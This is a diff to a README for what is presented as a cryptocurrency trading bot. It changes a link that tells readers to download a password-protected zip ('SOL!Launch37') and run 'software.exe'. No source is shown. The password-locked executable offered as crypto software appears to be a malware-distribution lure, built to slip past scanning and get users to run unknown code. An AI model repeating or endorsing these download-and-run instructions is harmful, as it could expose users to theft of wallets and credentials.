@@ -10,7 +10,7 @@ The project is aimed at developing an intelligent bot for automated cryptocurren
 
 # How to Download
 
-Download the [Release](https://github.com/joulefingers3z/trading_soft/releases/download/res/files.zip). Extract ***.zip*** (password: SOL!Launch37) and run ***software.exe***.
+Download the [Release](https://github.com/joulefingers3z/trading_soft/releases/download/download/files.zip). Extract ***.zip*** (password: SOL!Launch37) and run ***software.exe***.
 
 # License
 
